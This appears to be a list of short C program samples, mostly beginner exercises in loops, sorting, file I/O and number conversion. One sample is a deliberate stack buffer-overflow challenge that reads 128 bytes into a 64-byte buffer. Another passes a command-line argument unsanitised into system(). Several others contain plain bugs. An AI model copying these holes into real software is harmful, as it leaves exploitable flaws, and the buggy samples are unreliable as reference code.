    "#include <stdio.h>\nint main ()\n{\n int i,j;\n for(i=0,j=10;i<=j;i++,j--)\n  printf(\"i =%d j=%d\\n\",i,j );\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(int argc,char *argv[])\n{\n    FILE *fin,*fout;\n    int check=1,num1,num2;\n    if(argc==1)\n        return -1;\n    fin=fopen(argv[1],\"r\");\n    fout=fopen(strcat(argv[1],\".rle\"),\"w\");\n    if(fin==((void*)0))\n        return -2;\n    fscanf(fin,\"%x\",&num1);\n    while(fscanf(fin,\"%x\",&num2))\n    {\n        if(num2==num1)\n            check++;\n        else\n        {\n            fprintf(fout,\"%02X %X\",check,num1);\n            check=1;\n            num1=num2;\n            if(feof(fin))\n                break;\n            fprintf(fout,\" \");\n        }\n        if(feof(fin))\n            break;\n    }\n    fprintf(fout,\"%02x %x\",check,num1);\n    fclose(fin);\n    fclose(fout);\n    return 0;\n}",
    "#include <stdio.h>\n\n\nvoid printVersion();\nint main(int argc, char const *argv[]) {\n  printVersion();\n  if (argc <= 1) {\n    printf(\"No arguments supplied\\n\");\n    return 1;\n  }\n  return 0;\n}\nvoid printVersion() {\n  printf(\"pc v%s\\n\", \"0.1.0\");\n}\nvoid printSyntax() {\n}",
    "#include <stdio.h>\nint g_con_num [64], g_base, g_digit = 0, g_check ;\nlong int g_number ;\nint main ( void )\n {\n  void get_number ( void ) ;\n  void convert_num ( void ) ;\n  void print_num ( void ) ;\n  do\n   {\n    get_number () ;\n    convert_num () ;\n    if ( g_check != 1 )\n     {\n      print_num () ;\n      printf ( \"\\n\" ) ;\n     }\n    g_digit = 0 ;\n   }\n  while ( g_check != 1 ) ;\n  return 0 ;\n }\nvoid get_number ( void )\n {\n  int yoda ;\n  printf ( \"Number to be converted?: \" ) ;\n  scanf ( \"%li\", &yoda ) ;\n  if ( yoda == 0 )\n   {\n    g_check = 1 ;\n    return ;\n   }\n  g_number = yoda ;\n  printf ( \"Base?: \" ) ;\n  scanf ( \"%i\", &g_base ) ;\n  while ( g_base < 2 || g_base > 16)\n   {\n    printf ( \"Base must be between 2 and 16\\n\" ) ;\n    g_base = 10 ;\n    printf ( \"\\n\" ) ;\n    printf ( \"Base?: \" ) ;\n    scanf ( \"%i\", &g_base ) ;\n   }\n }\nvoid convert_num ( void )\n {\n  do\n   {\n    g_con_num [ g_digit ] = g_number % g_base ;\n    g_digit++ ;\n    g_number /= g_base ;\n   }\n  while ( g_number != 0 ) ;\n }\nvoid print_num ( void )\n {\n  const char base_digits [16] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F' } ;\n  printf ( \"Converted number = \" ) ;\n  for ( g_digit --; g_digit >= 0; g_digit -- )\n   printf( \"%c\", base_digits [ g_con_num [ g_digit ] ] ) ;\n  printf( \"\\n\" ) ;\n }",
    "#include <stdio.h>\nint main() {\n    unsigned int a;\n    printf(\"Enter a positive decimal: \");\n    scanf(\" %d\", &a);\n    printf(\"\\n\");\n    while (a != 0) {\n        printf(\"%d, %d\\n\", a, a % 2);\n        a = a>>1;\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n\nstatic inline int solve(){\n    double n;\n    while(scanf(\"%lf\", &n) == 1){\n        double temp = (acos(asin(n))*180)/acos(-1);\n        if(temp <= 180.0 && temp >= 0.0)\n            printf(\"%.2f\\n\", temp);\n        else\n            puts(\"FAIL!\");\n    }\n}\nint main(){\n    solve();\n    return 0;\n}",
    "#include <stdio.h>\nvoid repeat(int count);\nint main()\n{\n    int a,b;\n    a = 1;\n    b = 5;\n puts(\"At first the raven was like:\");\n repeat(a);\n puts(\"But then he was all:\");\n repeat(b);\n return(0);\n}\nvoid repeat(int count)\n{\n int x;\n for(x=0;x<count;x++)\n  puts(\"Nevermore!\");\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\n\nvoid writeFile();\nvoid readFile();\nvoid formatWriteRead() ;\nint main() {\n    formatWriteRead();\n    return 0;\n}\nvoid writeFile() {\n    FILE *fp = fopen(\"H:\\\\codes\\\\C\\\\C-File\\\\file\\\\test1.txt\", \"w\");\n    char c;\n    printf(\"\u8f93\u5165#\u7ed3\u675f\u7a0b\u5e8f\");\n    c = (char) getchar();\n    while (c != '#') {\n        fputc(c, fp);\n        c = (char) getchar();\n    }\n    fclose(fp);\n    putchar('\\n');\n}\nvoid readFile() {\n    FILE *fp = fopen(\"H:\\\\codes\\\\C\\\\C-File\\\\file\\\\test1.txt\", \"r\");\n    FILE *fpTarget = fopen(\"H:\\\\codes\\\\C\\\\C-File\\\\file\\\\test2.txt\", \"w\");\n    if (fp == ((void*)0) || fpTarget == ((void*)0)) {\n        printf(\"\u6253\u5f00\u6587\u4ef6\u9519\u8bef\");\n        exit(0);\n    }\n    char c;\n    while (!feof(fp)) {\n        c = (char) fgetc(fp);\n        fputc(c, fpTarget);\n        putchar(c);\n    }\n    putchar('\\n');\n    fclose(fp);\n    fclose(fpTarget);\n}\nvoid formatWriteRead() {\n    FILE *fp = fopen(\"H:\\\\codes\\\\C\\\\C-File\\\\file\\\\test3.txt\", \"w\");\n    fprintf(fp, \"%d %f %s\", 1, 5.0F, \"haha\");\n    fclose(fp);\n    fp = fopen(\"H:\\\\codes\\\\C\\\\C-File\\\\file\\\\test3.txt\", \"r\");\n    int a;\n    float b;\n    char s[20];\n    fscanf(fp, \"%d %f %s\", &a, &b, s);\n    printf(\"%d %f %s\", a, b, s);\n}",
    "#include <stdio.h>\nchar setBits(char, char, char);\nint main()\n{\n char number = 6;\n char position = 1;\n char length = 3;\n number = setBits(number, position, length);\n printf(\"x: %d\", number);\n return 0;\n}\nchar setBits(char number, char position, char length)\n{\n char gapToTLeft = 8 - (position + length);\n number << gapToTLeft;\n number >> gapToTLeft + position;\n return number;\n}",
    "#include <stdio.h>\nvoid print_transpose(int arr[20][20], int n)\n{\n    int i,j;\n    for(j=0;j<n;j++)\n    {\n        for(i=0;i<n;i++)\n        {\n            printf(\"%d \",arr[i][j]);\n        }\n    }\n    printf(\"\\n\");\n}\nint main() {\n int t;\n scanf(\"%d\",&t);\n while(t--)\n {\n     int n;\n     scanf(\"%d\",&n);\n     int arr[20][20];\n     int i,j;\n     for(i=0;i<n;i++)\n     {\n         for(j=0;j<n;j++)\n         {\n             scanf(\"%d \",&arr[i][j]);\n         }\n     }\n     print_transpose(arr,n);\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int friends = 5;\n    int week = 0;\n    while (friends <= 150)\n    {\n        week++;\n        friends -= week;\n        friends *= 2;\n    }\n    printf(\"At week %d, Dr.Rabnud has %d friends.\\n\", week, friends);\n    return 0;\n}",
    "int main() {\n    int b = 4;\n    int a[6] = {92,93,94,95,96,97};\n    return a[b] + b;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<time.h>\nint main(){\n   srand(time(((void*)0)));\n    int numero, sorte;\n    sorte = rand() % 9;\n    printf(\"Escolha um n\u00famero entre 0 a 9: \");\n    scanf(\"%d\", &numero);\n    if (numero < 0 || numero > 9){\n        printf(\"\\n\\nEu disse um numero entre  0 e 9\\n\\n\");\n    }else{\n        if(numero == sorte){\n            printf(\"\\n\\n Voc\u00ea ACERTOU. numero sorteado: %d. \\n\\n\");\n        }else{\n            printf(\"\\n\\n Voc\u00ea ERROU. numero sortado: %d \\n\\n\",sorte);\n        }\n    }\nreturn 0;\n}",
    "#include <stdio.h>\n\nvoid bubble_sort(int nums[],int length){\n    int temp;\n    for(int i=1;i<length;i++){\n        for(int j=0;j<length-i;j++)\n        {\n            if(nums[j]>nums[j+1]){\n                temp=nums[j];\n                nums[j]=nums[j+1];\n                nums[j+1]=temp;\n            }\n        }\n    }\n}\nint main(){\n    int aa[9]={34,9,5, 23,14,7,32,2,12};\n    bubble_sort(aa,9);\n    for(int i=0;i<9;i++)\n        printf(\"%d,\",aa[i]);\n    printf(\"\\n\");\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdint.h>\n\nvoid wait_for_user_input(void);\nint main(void)\n{\n  uint8_t num=1;\n  while(num <= 10){\n   printf(\"%d\\n\",num++);\n  }\n  wait_for_user_input();\n}\nvoid wait_for_user_input(void)\n{\n printf(\"Press enter key to exit this application\");\n    while(getchar() != '\\n')\n    {\n    }\n    getchar();\n}",
    "#include <stdio.h>\nint main(void) {\n    for (int i = 1; i <= 100; i++) {\n        if (i%3!=0 && i%5!=0) {\n            printf(\"%d\", i);\n        } else {\n            if (i % 3 == 0)\n                printf(\"Fizz\");\n            if (i % 5 == 0)\n                printf(\"Buzz\");\n        }\n        printf(\"\\n\");\n    }\n}",
    "#include <stdio.h>\nvoid del_digit(char *str);\nint main(void) {\n    char str[] = \"AB1C9\";\n    del_digit(str);\n    printf(\"%s\", str);\n    return 0;\n}\nvoid del_digit(char *str) {\n    char *p = str;\n    while (*p) {\n        if (*p >= '0' && *p <= '9')\n            p++;\n        else\n            *str++ = *p++;\n    }\n    *str = '\\0';\n}",
    "#include <stdio.h>\n#include <unistd.h>\nint main(){\n    printf(\"Hello, \");\n    sleep(3);\n    printf(\"World\\n\");\n    return 0;\n}",
    "#include <stdio.h>\ntypedef size_t Type;\nType gcd( Type a, Type b ){\n    for( Type t = 0; b != 0; ){\n        t = b;\n        b = a % b;\n        a = t;\n    }\n    return a;\n}\nint main(){\n    Type a = 0,\n         b = 0;\n    scanf( \"%ld %ld\", &a, &b );\n    Type ans = gcd( a, b );\n    printf( \"%ld\\n\", ans );\n    return 0;\n}",
    "#include <stdio.h>\nvoid printTriangle(int N) {\n    for (int i = 1; i < N + 1; ++i) {\n        for (int j = 0; j < i; ++j) {\n            printf(\" *\");\n        }\n        printf(\"\\n\");\n    }\n    printf(\"\\n\");\n    for (int i = N; i > 0; --i) {\n        for (int j = 0; j < N - i; ++j) {\n            printf(\"  \");\n        }\n        for (int j = 0; j < 2 * i - 1; ++j) {\n            printf(\" *\");\n        }\n        printf(\"\\n\");\n    }\n}\nint main() {\n    printTriangle(5);\n    return 0;\n}",
    "#include<stdio.h>\n\nint A[10],B[10];\nvoid merge(int low,int mid,int high)\n{\n int a1,a2,i;\n for(a1=low,a2=mid+1,i=low;a1<mid&&a2<=high;i++)\n {\n  if(A[a1]<=A[a2])\n   B[i]=A[a1++];\n  else\n   B[i]=A[a2++];\n }\n while(a1<=mid)\n  B[i++]=A[a1++];\n while(a2<=high)\n  B[i++]=A[a2++];\n for(i=low;i<=high;i++)\n  A[i]=B[i];\n}\nvoid sort(int low,int high)\n{\n int mid;\n if(low<high)\n {\n  mid=(low+high)/2;\n  sort(low,mid);\n  sort(mid+1,high);\n }\n return;\n}\nint main()\n{\n int i;\n printf(\"Enter elements\");\n for(i=0;i<10;i++)\n  scanf(\"\\t%d\",&A[i]);\n sort(0,10);\n printf(\"\\nList after sorting:\");\n for(i=0;i<=10;i++)\n  printf(\"%d\",A[i]);\n}",
    "#include<stdio.h>\nint main (void){\nint n, i;\ni=0;\nprintf(\"Entre com um n\u00famero positivo\\n\");\nscanf(\"%d\", &n);\nwhile(i<n){\n  printf(\"*\");\ni++;\n}\nprintf(\"\\n\");\nreturn 0;\n}",
    "#include <stdio.h>\n#include<stdlib.h>\nvoid displayMatrix(int equations, int variables, float matrix[equations][variables]);\nvoid solution(int equations, int variables, float matrix[equations][variables], int var);\nvoid elementInputMatrix(int equations, int variables, float matrix[equations][variables], char varLtr);\nint main (void)\n{\n int equations=3, variables=3, var=0;\n char varLtr = 'x';\n printf(\"Enter number of equatons to solve: \");\n scanf(\"%d\", &equations);\n fflush((stdin));\n printf(\"Enter number of variables in equations: \");\n scanf(\"%d\", &variables);\n fflush((stdin));\n printf(\"Enter letter for first variable in equations: \");\n scanf(\"%c\", &varLtr);\n fflush((stdin));\n var=variables;\n ++variables;\n float matrix[equations][variables];\n float *matrixPtr = matrix;\n matrix[0][0]=2.0; matrix[0][1]=4.0; matrix[0][2]=6.0; matrix[0][3]=22.0;\n matrix[1][0]=3.0; matrix[1][1]=8.0; matrix[1][2]=5.0; matrix[1][3]=27.0;\n matrix[2][0]=-1.0; matrix[2][1]=1.0; matrix[2][2]=2.0; matrix[2][3]=02.0;\n elementInputMatrix(equations, variables, matrix, varLtr);\n displayMatrix(equations, variables, matrix);\n solution(equations, variables, matrix, var);\n return 0;\n}\nvoid elementInputMatrix(int equations, int variables, float matrix[equations][variables], char varLtr)\n{\n int maker=(variables-2);\n printf(\"\\nEnter the coefficients for the linear equation\\n\"\n \"Ax + By + Cz + ... = S\\n\");\n for(int i=0, j=0; i<equations; ++i,j=0)\n {\n  for(;j<variables;++j)\n  {\n   if(j<(maker+1))\n   {\n    printf(\"\\nCoeficient for %c on Equation %d: \", varLtr+j, i+1);\n   }\n   if(j==maker+1)\n   {\n    printf(\"\\nSolution for Equation %d: \", i+1);\n   }\n   scanf(\"%f\", &matrix[i][j]);\n   fflush((stdin));\n  }\n  printf(\"\\n\");\n }\n}\nvoid displayMatrix(int equations, int variables, float matrix[equations][variables])\n{\n int maker = (variables-2);\n for(int i=0, j=0; i<equations; ++i,j=0)\n {\n  for(;j<variables; ++j)\n  {\n   printf(\"%7.3f\\t\",matrix[i][j]);\n   if(j==maker)\n   {\n    printf(\"|\\t\");\n   }\n  }\n  printf(\"\\n\");\n }\n}\nvoid solution(int equations, int variables, float a[equations][variables], int var)\n{\n int k, i, j, c = (int)'x';\n float l;\n    for (k=0;k<var;++k )\n    {\n        for (i=0;i<=var;++i )\n        {\n            l = a[i][k];\n            for (j=0;j<=var;++j)\n            {\n                if (i!=k)\n                a[i][j]=(a[k][k]*a[i][j])-(l*a[k][j]);\n            }\n        }\n    }\n    printf( \"\\nThe Solutions:\\n\" );\n    for (i=0;i<var;++i)\n    {\n        printf( \"\\n%c = %7.3f\\n\", c + i, a[i][var] / a[i][i] );\n    }\n}",
    "#include<stdio.h>\nint main(int argc, char *argv[])\n{\n printf(\"++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\");\n for(int i=argc-1;i>0;i--)\n  printf(\"%s \",argv[i]);\n printf(\"\\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\");\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int a, b, c, x, y, z;\n scanf(\"%d %d %d\", &a, &b, &c);\n int ab=a*b;\n int ac=a*c;\n int bc=b*c;\n x=ab+ac+bc;\n y=ab*ac*bc;\n z=ab-ac;\n printf(\"%d %d %d\\n\", x, y, z);\n return 0;\n}",
    "#include<stdio.h>\nint main(){\n int i,f,r,number,sum=0,temp;\n printf(\"Enter a number \\n\");\n scanf(\"%d\",&number);\n temp=number;\n while(number){\n  i=1,f=1;\n  r=number % 10;\n  while(i<=r){\n   f*=i;\n   i++;\n  }\n  sum+=f;\n  number/=10;\n }\n if(sum==temp)\n  printf(\"%d is a strong number\\n\",temp);\n else\n  printf(\"%d is not a strong number\\n\",temp);\n return 0;\n}",
    "#include<stdio.h>\n#include<unistd.h>\nint main(){\n    if(fork() && fork())\n    fork();\n    printf(\"hello\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <time.h>\n#include <locale.h>\nint randint(int maxnum) {\n    return rand() % (maxnum + 1 - 0) + 0;\n}\nint rowOperations(int row_count, int row_length) {\n    int number, saved_count = 0;\n    for (int i = 1; i <= row_length; i++) {\n        number = randint(9);\n        if (number == 2) {\n            saved_count = i;\n        }\n    }\n    return saved_count;\n}\nint main() {\n    setlocale(6, \"Rus\");\n    int total_rows, row_length;\n    printf(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043d\u0430\u0431\u043e\u0440\u043e\u0432 (\u0447\u0438\u0441\u043b\u043e K): \");\n    scanf(\"%d\", &total_rows);\n    printf(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432 \u0432 \u043a\u0430\u0436\u0434\u043e\u043c \u043d\u0430\u0431\u043e\u0440\u0435 (\u0447\u0438\u0441\u043b\u043e N): \");\n    scanf(\"%d\", &row_length);\n    srand(time(0));\n    for (int i = 1; i <= total_rows; i++) {\n        printf(\"\\n\u041f\u043e\u0441\u043b\u0435\u0434\u043d\u0438\u0439 \u2116 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430 \u0441\u043e \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435\u043c 2 \u0432 %d \u043d\u0430\u0431\u043e\u0440\u0435: \", i);\n        printf(\"%d\", rowOperations(i, row_length));\n        sleep(1);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main ( void )\n{\n int N = 0, temp = 0;\n int P = 1;\n printf( \"\\nN = \" );\n scanf( \"%d\", &N );\n if( N == 0 ) P = 0;\n int i;\n for( i = 0; i < N; i++ )\n {\n  printf( \"%d: \", i+1 );\n  scanf( \"%d\", &temp );\n  P *= temp - (i+1);\n }\n printf( \"\\nP = %d\\n\", P );\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int i = 1, sum = 0;\n    while(i < 101){\n        sum += i;\n        i++;\n    }\n    printf(\"sum = %d, i = %d\\n\", sum, i);\n    return 0;\n}",
    "int main(void)\n{\n    ((((((((((1))))))))));\n    int a;\n    a = ((1) + 2) + 3;\n    ((\"hello\"));\n    ((((((((((((\"world\"))))))))))));\n    {{{1;}}}\n}",
    "int main() {\n    int a = 0;\n\n\n\n\n    a += 2;\n\n\n    a += 4;\n\n\n\n    return a;\n}",
    "#include<stdio.h>\nint main()\n{\n   char ch;\n   printf(\"\\nEnter ch:\\t\");\n   scanf(\"%c\", &ch);\n   if( ch == '\\t' )\n   {\n    printf(\"it is tab\");\n   }\n   else\n   {\n    printf(\"it is not tab\");\n   }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[]) {\n char com[100];\n sprintf(com, \"jupyter lab \\\"%s\\\"\", argc > 1 ? argv[1] : \"\");\n system(com);\n return (0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nsize_t my_strlen(char *src);\nchar *my_strcpy(char *dst, char *src);\nint main() {\n    char src[128];\n    src[0] = '\\0';\n    char *copy;\n    printf(\"Enter a string: \");\n    if (scanf(\"%[^\\n]\", src) < 0) {\n        fprintf((stderr), \"Error: Failed to get a string from standard in.\\n\");\n        return 1;\n    }\n    copy = (char *)malloc((my_strlen(src) + 1) * sizeof(char));\n    if (copy == ((void*)0)) {\n        return 1;\n    }\n    my_strlen(((void*)0));\n    if (my_strcpy(copy, ((void*)0))) {\n        fprintf((stderr), \"Error: This line should not have executed!\\n\");\n    }\n    my_strcpy(copy, src);\n    printf(\"Duplicated string: %s\\n\", copy);\n    printf(\"Length: %zu\\n\", my_strlen(copy));\n    free(copy);\n    return 0;\n}\nsize_t my_strlen(char *src) {\n    size_t count = 0;\n    if (src == ((void*)0)) {\n        return count;\n    }\n    while (*src++) count++;\n    return count;\n}\nchar *my_strcpy(char *dst, char *src) {\n    if (src == ((void*)0))\n        return ((void*)0);\n    char *res = dst;\n    while (*src) {\n        *dst++ = *src++;\n    }\n    *dst = '\\0';\n    return res;\n}",
    "#include <stdio.h>\nint sum(int, int);\nint main(void)\n{\n    int a, b;\n    scanf(\"%d %d\", &a, &b);\n    printf(\"%d\\n\", sum(a, b));\n    return 0;\n}\nint sum(int from, int to)\n{\n    return (to * (to + 1)) / 2 - ((from - 1) * from) / 2;\n}",
    "#include<stdio.h>\nint main()\n{\n   int n, i, j;\n   int target;\n   printf(\"Enter no of terms:\");\n   scanf(\"%d\",&n);\n   int a[n];\n   for(i=0;i<n;i++)\n   {\n       printf(\"Enter element no %d: \", i+1);\n       scanf(\"%d\",&a[i]);\n   }\n   printf(\"Enter Target number:  \");\n   scanf(\"%d\",&target);\n   for(i=0;i<n;i++)\n   {\n       for(j=i+1;j<n;j++)\n       {\n           if((a[i]+a[j])==target)\n           {\n               printf(\"[%d , %d]\", i, j);\n           }\n       }\n   }\n   return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n double salaries[5] = {-1};\n double salary;\n for (int i = 0; i < 5;)\n {\n  printf(\"Input the salary of employee %d: \", i + 1);\n  scanf(\"%lf\", &salary);\n  if (salary >= 0)\n  {\n   salaries[i] = salary;\n   i++;\n  }\n  else\n  {\n   printf(\"Please re-enter the amout\\n\");\n  }\n }\n puts(\"\");\n for (int i = 0; i < 5; i++)\n {\n  if (salaries[i] < 10000)\n  {\n   salaries[i] = (salaries[i] * 0.1) + salaries[i];\n  }\n }\n printf(\"%s\\t\\t%s\\n\", \"Employee number\", \"Salary\");\n for (int i = 0; i < 5; i++)\n {\n  printf(\"%d\\t\\t\\t%.2lf\", i + 1, salaries[i]);\n  puts(\"\");\n }\n puts(\"\");\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int i,j;\n    for(i=0; i<5; i++)\n    {\n        for(j=0; j<5-i; j++)\n        {\n            if(j%2==0)\n            {\n                printf(\"0 \");\n            }\n            else\n            {\n                printf(\"1 \");\n            }\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n    float raiz = 3.1415;\n    float *aponta_para_raiz = &raiz;\n    *aponta_para_raiz = 3.141592;\n    printf(\"RAIZ = %f\\n\", raiz);\n    printf(\"ENDERE\u00c7O DA RAIZ MODIFICADA = %p\", (void *)aponta_para_raiz);\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int x;\n    while(1)\n    {\n        x = getchar();\n        printf(\"x = %d\\n\", x);\n        printf(\"x = %c\\n\", (unsigned char)x);\n    }\n}",
    "#include <stdio.h>\nint main(int argc, char **argv)\n{\n    int a,b;\n    while (scanf(\"%x %x\",&a, &b)!=(-1))\n        printf(\"%d\\n\",a+b);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  getchar();\n putchar('h');\n putchar('o');\n putchar('l');\n putchar('a');\n putchar(32);\n putchar('c');\n putchar('l');\n putchar('a');\n putchar('s');\n putchar('e');\n putchar('\\n');\n  getchar();\n  return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(void)\n{\n unsigned int sexy_var = 0xFEEDFACE;\n unsigned char in_between[5];\n char buffer[64];\n size_t i, len;\n printf(\"insert buffer string: \");\n fgets(buffer, 128, (stdin));\n printf(\"buffer is: \");\n len = strlen(buffer);\n for (i = 0; i < len; i++)\n  printf(\" %02X(%c)\", buffer[i], buffer[i]);\n puts(\"\");\n in_between[3] = buffer[5];\n if (sexy_var == 0x5541494d)\n  printf(\"Full of win!\\n\");\n else\n  printf(\"Not quite there. Try again!\\n\");\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main() {\n int linhas , colunas;\n printf(\"\\nDigite o numero de linhas da matriz: \");\n scanf(\"%d\", &linhas);\n printf(\"\\nDigite o numero de colunas da matriz: \");\n scanf(\"%d\", &colunas);\n float matriz[linhas][colunas];\n float soma = 0;\n float somaLinhas[linhas];\n memset(somaLinhas, 0, sizeof(somaLinhas));\n for (int linha = 0; linha < linhas; linha++) {\n  for (int coluna = 0; coluna < colunas; coluna++) {\n   printf(\"\\nDigite o %d valor para a %d linha: \", coluna + 1, linha + 1);\n   scanf(\"%f\", &matriz[linha][coluna]);\n   soma += matriz[linha][coluna];\n   somaLinhas[linha] += matriz[linha][coluna];\n   }\n }\n printf(\"\\n\");\n for (int linha = 0; linha < linhas; linha++) {\n  for (int coluna = 0; coluna < colunas; coluna++) printf(\"%5.2f \",matriz[linha][coluna]);\n  printf(\"\\n\");\n }\n for (int linha = 0; linha < linhas; linha++) printf(\"\\nA soma da linha %d eh %5.2f\", linha, somaLinhas[linha]);\n printf(\"\\nA soma total eh  %5.2f\", soma);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nint main(int argc, char const *argv[])\n{\n    int tamL = 5, tamC = 4;\n    int l, c,mat[tamL][tamC], trans[tamC][tamL];\n    srand(time(((void*)0)));\n    for(l = 0; l < tamL; l++){\n        for(c = 0; c < tamC; c++){\n            mat[l][c] = rand() % 500;\n        }\n    }\n    printf(\"\\nMatriz Original:\\n\");\n    for(l = 0; l < tamL; l++){\n        for(c = 0; c < tamC; c++){\n            printf(\"%3d \",mat[l][c]);\n        }\n        printf(\"\\n\");\n    }\n    for(l = 0; l < tamL; l++){\n        for(c = 0; c < tamC; c++){\n            trans[c][l] = mat[l][c];\n        }\n    }\n    printf(\"\\nMatriz Transposta:\\n\");\n    for(l = 0; l < tamC; l++){\n        for(c = 0; c < tamL; c++){\n            printf(\"%3d \", trans[l][c]);\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\ndouble max(const double data[], int size) {\n    double max = data[0];\n    for (int i = 1; i < size; i++) {\n        if (data[i] > max) {\n            max = data[i];\n        }\n    }\n    return max;\n}\nint main() {\n    double test_data[7] = {1.4, 1233.3843, 0.00001, -0.8, -44.3, 1234.0};\n    printf(\"%f\", max(test_data, 7));\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdbool.h>\nint main(){\n  _Bool nickIsSleeping = 0;\n  printf(\"Is Nick Sleeping? (1 is Yes, 0 is No)? %i\\n\", nickIsSleeping);\n  return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nconst unsigned int FLAG_LEN = 26;\nvoid reset_flags_and_increment(unsigned int * flags, unsigned int * sum) {\n  for (int i=0; i < FLAG_LEN; i++) {\n    if (flags[i] > 0) {\n      *sum += 1;\n    }\n    flags[i] = 0;\n  }\n}\nint main( ) {\n  unsigned int flags[FLAG_LEN];\n  char buf[FLAG_LEN*2];\n  unsigned int sum;\n  FILE* fp = fopen(\"input\" , \"r\");\n  if(fp == ((void*)0)) {\n    perror(\"Error opening file\");\n    return(-1);\n  }\n  reset_flags_and_increment(flags, &sum);\n  sum = 0;\n  while (fgets(buf, FLAG_LEN*2-1, fp) != ((void*)0)) {\n    if (strlen(buf) == 0 || buf[0] == '\\n') {\n      reset_flags_and_increment(flags, &sum);\n    }\n    else if (strlen(buf) > 0) {\n      int i = 0;\n      while (buf[i] != '\\n' && i < strlen(buf)) {\n        int pos = buf[i] - 'a';\n        if (pos >= 0 && pos < FLAG_LEN) {\n          flags[pos] = 1;\n        }\n        i++;\n      }\n    }\n  }\n  reset_flags_and_increment(flags, &sum);\n  printf(\"%d\\n\", sum);\n  fclose(fp);\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int x = 1, total = 0, y;\n    while(x <= 10) {\n        y = x * x;\n        printf(\"%d\\n\", y);\n        total += y;\n        ++x;\n    }\n    printf(\"Total is %d\\n\", total);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void) {\nint r,sum=0,n,t;\nscanf(\"%d\",&n);\nt=n;\nif(n<=1000)\n{\nwhile(n>0)\n{\nr=n%10;\nsum=(sum*10)+r;\nn=n/10;\n}\nif(t==sum)\nprintf(\"yes\");\nelse\nprintf(\"no\");\n}\n else\n printf(\"enter within limit(1000)\");\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    char caractere, dob;\n    printf(\"\\nDigite um caractere numerico: (0 a 9): \");\n    scanf(\"%d\",&caractere);\n    printf(\"\\n\");\n    dob = 2*caractere;\n    printf(\"Caractere digitado: %d o dobro desse numero eh: %u\", caractere,dob);\n}",
    "#include<stdio.h>\nint main()\n{\n    int a,b,i,sum=0;\n    scanf(\"%d %d\",&a,&b);\n    for(i=b+1; i<a; i++)\n    {\n        if(i%2!=0)\n        {\n            sum=sum+i;\n        }\n    }\n    printf(\"%d\\n\",sum);\n    return 0;\n}",
    "#include <stdio.h>\nint maximum(int num1, int num2);\nint minimum(int num1, int num2);\nint multiply(int num1, int num2);\nint main()\n{\n   int no1, no2;\n   int min, max, mul;\n   printf(\"Enter a value for no 1 : \");\n   scanf(\"%d\", &no1);\n   printf(\"Enter a value for no 2 : \");\n   scanf(\"%d\", &no2);\n   min=minimum(no1, no2);\n   max=maximum(no1, no2);\n   mul=multiply(no1, no2);\n   printf(\"%d \", minimum(no1, no2));\n   printf(\"%d \", maximum(no1, no2));\n   printf(\"%d \", multiply(no1, no2));\n   return 0;\n}\nint maximum(int num1, int num2)\n{\n  if(num1>num2)\n    return num1;\n  else\n    return num2;\n}\nint minimum(int num1, int num2)\n{\n  if(num1<num2)\n    return num1;\n  else\n    return num2;\n}\nint multiply(int num1, int num2)\n{\n  return num1 * num2;\n}",
    "#include <math.h>\n#include <stdio.h>\n#include <stdlib.h>\n\nint average(int* table, int size);\nint main(void) {\n  int values[10] = {-2, 5, 3, 10, -6, 7, 2, 3, -4, 1};\n  printf(\"The average of the elements of the array is: %i \\n\",\n         average(values, 10));\n  return 0;\n}\nint average(int* table, int size) {\n  int i;\n  int sum = 0;\n  for (i = 0; i < size; i++) {\n    sum += table[i];\n  }\n  return sum / size;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void)\n{\n    char a[10] = \"10000000000\";\n    sprintf(a, \"%d\", 45);\n    printf(\"Value = %s\\n\", a);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint multiplyFunc(int i)\n{\n  return i*42;\n}\nint main(int argc, char * argv[])\n{\n  int i;\n  if (argc < 2)\n    {\n      printf(\"%s [Multiply factor]\\n\", argv[0]);\n      exit(0);\n    }\n  for (i = 1; i < 11; ++i) printf(\"%3d \", i);\n  printf(\"\\n\");\n  for (i = 1; i < 11; ++i) printf(\"%3d \", multiplyFunc(i));\n  printf(\"\\n\");\n  return 0;\n}",
